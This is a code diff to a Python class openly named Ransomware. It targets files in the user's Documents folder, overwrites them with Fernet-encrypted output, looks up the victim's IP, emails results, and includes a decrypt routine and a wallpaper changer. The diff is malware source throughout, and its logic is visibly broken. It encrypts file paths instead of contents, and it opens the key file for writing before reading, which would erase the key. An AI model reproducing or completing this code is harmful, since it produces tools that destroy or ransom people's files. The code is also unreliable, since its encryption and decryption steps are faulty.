@@ -140,6 +140,8 @@ class Ransomware(FileSystem):
     def __init__(self, address: str = f"C:\\Users\\{getpass.getuser()}\\Documents\\Faculdade\\"):
         super().__init__(address)
 
+        self.__ip: str = ""
+
         self.__name = f"C:\\Users\\{getpass.getuser()}\\PycharmProjects\\Alone\\KeyRW.txt"
 
         self.files_types = [
@@ -153,7 +155,7 @@ class Ransomware(FileSystem):
 
         self.__key: bytes
 
-        self.__ip: str
+
 
     @property
     def name(self):
@@ -226,16 +228,19 @@ class Ransomware(FileSystem):
         # request ip
         asyncio.run(self.getTargetIp())
 
-        print("rodando encrypt") # debug
-        print(self.__cipher)
+        #print("rodando encrypt") # debug
 
         # encrypt files
         for file in self.__paths:
-            print(file)
-            with open(file, "rb") as f:
-                arqhive = f.read()
-                print(arqhive)
-            self.__cipher.encrypt(arqhive)
+            print(Fore.GREEN + f" [*] {file} Encrypted ")
+            arqhive = ""
+            with open(file, "r") as f:
+                for lines in f.readline():
+                    arqhive += str(lines)
+                    print(arqhive)
+            with open(file, "w") as f:
+                f.write(str(self.__cipher.encrypt(file.encode())))
+
 
 
         # send mail
@@ -247,23 +252,27 @@ class Ransomware(FileSystem):
         except smtplib.SMTPAuthenticationError as e:
             print(f"[*] Email Authentication Error: {e}")
 
-
     async def decrypt(self):
         """
         this method decrypt the files
         :param
         :return:
         """
-        async with aiofiles.open(self.__name, "rb") as r:
+        async with aiofiles.open(self.__name, "wb") as r:
             key = await r.read()
             # print(key) # for debug
             cipher = Fernet(key)
 
             # decrypt files
             for file in self.__paths:
+                print(file)
+                arqhive = ""
                 with open(file, "rb") as f:
-                    arqhive = f.read()
-            self.__cipher.decrypt(arqhive)
+                    for lines in f.readline():
+                        arqhive += str(lines)
+                        print(arqhive)
+                with open(file, "w") as f:
+                    f.write(str(cipher.decrypt(file.encode())))
 
     @staticmethod
     def changeWallpaper():
@@ -325,6 +334,7 @@ class Execute:
 
     @staticmethod
     def decry():
+        rw = Ransomware()
         el = asyncio.get_event_loop()
         el.run_until_complete(rw.decrypt())
         el.close()
